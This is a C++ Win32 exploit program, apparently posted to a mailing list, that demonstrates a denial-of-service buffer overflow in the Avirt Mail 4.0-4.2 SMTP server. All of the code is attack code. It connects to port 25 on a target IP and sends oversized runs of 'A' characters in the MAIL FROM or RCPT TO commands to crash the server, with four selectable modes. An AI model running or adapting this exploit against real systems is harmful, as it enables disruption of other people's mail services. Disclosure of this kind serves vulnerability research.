/*
   Small piece of code demonstrating DoS vulnerability in Avirt Mail 4.0-4.2
   wersion@trust-me.com
   Win32 console code
*/
#include <mem.h>
#include <winsock.h>
#include <iostream.h>
#include <stdlib.h>

#define RCPT_SIZE 272
#define FROM_SIZE 556

struct sckssString
{
   char *szBuffer;
   int nSize;
};

char szHELO[] = "HELO anonymous";
char szMAIL[] = "MAIL FROM: ";
char szRCPT[] = "RCPT TO: ";
char szQUIT[] = "QUIT";
char szDATA[] = "DATA\nTest data\n.";

void socksenddata(int socket, sckssString* data)
{
   if(send(socket,data->szBuffer,data->nSize,NULL)!=SOCKET_ERROR)
   {
      cout << "->" << data->szBuffer << endl;
      return;
   }
   else
   {
      cout << endl << "WSA error (" << WSAGetLastError() << ")" << endl;
      exit(1);
   }
}

void socksendendline(int socket)
{
   if(send(socket,"\n",1,NULL)!=SOCKET_ERROR) return;
   else
   {
      cout << endl <<  "WSA error (" << WSAGetLastError() << ")" << endl;
      exit(1);
   }
}

void socksendanum(int socket, unsigned long int num)
{
   char *tempa = new char[num+1];
   memset(tempa,'A',num);
   tempa[num]=0;
   if(send(socket,tempa,num,NULL)!=SOCKET_ERROR)
   {
      cout << "->" << tempa << endl;
      return;
   }
   else
   {
      cout << endl <<  "WSA error (" << WSAGetLastError() << ")" << endl;
      exit(1);
   }
   delete[] tempa;
}

int main(int argv, char **argc)
{
   if(argv<3)
   {
      cout << "Usage: " << argc[0] << " ip-address type" << endl;
      cout << "Types:" << endl;
      cout << "1 - Overflow in RCPT TO: command.   (aborted session)" << endl;
      cout << "2 - Overflow in MAIL FROM: command. (aborted session)" << endl;
      cout << "3 - Overflow in RCPT TO: command.   (finnished session)" << endl;
      cout << "2 - Overflow in MAIL FROM: command. (finnished session)" << endl;
      exit(1);
   }
   WORD wVersionRequested = MAKEWORD(1,1);
   WSADATA wsaData;
   WSAStartup(wVersionRequested, &wsaData);

   SOCKADDR_IN saExploit;
   saExploit.sin_family = PF_INET;
   saExploit.sin_addr.s_addr = inet_addr(argc[1]);
   saExploit.sin_port = htons(25);

   SOCKET sckExploit = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (sckExploit == INVALID_SOCKET)
   {
      cout << "WSA error (" << WSAGetLastError() << ")" << endl;
      WSACleanup();
      return 1;
   }

   if (connect(sckExploit,(LPSOCKADDR)&saExploit,sizeof(saExploit))==SOCKET_ERROR)
   {
      cout << "WSA error (" << WSAGetLastError() << ")" << endl;
      shutdown(sckExploit,2);
      closesocket(sckExploit);
      WSACleanup();
      return 1;
   }

   sckssString sckssHelo;
   sckssHelo.nSize = strlen(szHELO);
   sckssHelo.szBuffer = new char[sckssHelo.nSize+1];
   strcpy(sckssHelo.szBuffer, szHELO);

   sckssString sckssMail;
   sckssMail.nSize = strlen(szMAIL);
   sckssMail.szBuffer = new char[sckssMail.nSize+1];
   strcpy(sckssMail.szBuffer, szMAIL);

   sckssString sckssRcpt;
   sckssRcpt.nSize = strlen(szRCPT);
   sckssRcpt.szBuffer = new char[sckssRcpt.nSize+1];
   strcpy(sckssRcpt.szBuffer, szRCPT);

   sckssString sckssQuit;
   sckssQuit.nSize = strlen(szQUIT);
   sckssQuit.szBuffer = new char[sckssQuit.nSize+1];
   strcpy(sckssQuit.szBuffer, szQUIT);

   sckssString sckssData;
   sckssData.nSize = strlen(szDATA);
   sckssData.szBuffer = new char[sckssData.nSize+1];
   strcpy(sckssData.szBuffer, szDATA);

   cout << "Beginning session..." << endl;

   switch(atoi(argc[2]))
   {
      case 1:
      {
         socksenddata(sckExploit,&sckssHelo);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssMail);
         socksendanum(sckExploit,5);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssRcpt);
         cout << "Overflowing RCPT TO:" << endl;
         socksendanum(sckExploit,RCPT_SIZE);
         socksendendline(sckExploit);

         cout << "Aborting session before data." << endl;
         socksenddata(sckExploit,&sckssQuit);
         socksendendline(sckExploit);
         break;
      }
      case 2:
      {
         socksenddata(sckExploit,&sckssHelo);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssMail);
         cout << "Overflowing MAIL FROM:" << endl;
         socksendanum(sckExploit,FROM_SIZE);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssRcpt);
         socksendanum(sckExploit,5);
         socksendendline(sckExploit);

         cout << "Aborting session before data." << endl;
         socksenddata(sckExploit,&sckssQuit);
         socksendendline(sckExploit);
         break;
      }
      case 3:
      {
         socksenddata(sckExploit,&sckssHelo);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssMail);
         socksendanum(sckExploit,5);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssRcpt);
         cout << "Overflowing RCPT TO:" << endl;
         socksendanum(sckExploit,RCPT_SIZE);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssData);
         socksendendline(sckExploit);

         cout << "Ending session." << endl;
         socksenddata(sckExploit,&sckssQuit);
         socksendendline(sckExploit);
         break;
      }
      case 4:
      {
         socksenddata(sckExploit,&sckssHelo);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssMail);
         cout << "Overflowing MAIL FROM:" << endl;
         socksendanum(sckExploit,FROM_SIZE);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssRcpt);
         socksendanum(sckExploit,5);
         socksendendline(sckExploit);

         socksenddata(sckExploit,&sckssData);
         socksendendline(sckExploit);

         cout << "Ending session." << endl;
         socksenddata(sckExploit,&sckssQuit);
         socksendendline(sckExploit);
         break;
      }
      default:
      {
         cout << "Type " << argc[2] << " not allowed." << endl;
         break;
      }
   }

   shutdown(sckExploit,2);
   closesocket(sckExploit);
   WSACleanup();
   cout << endl << "Ready!" << endl;
   return 0;
}


--=====================_972334194==_--
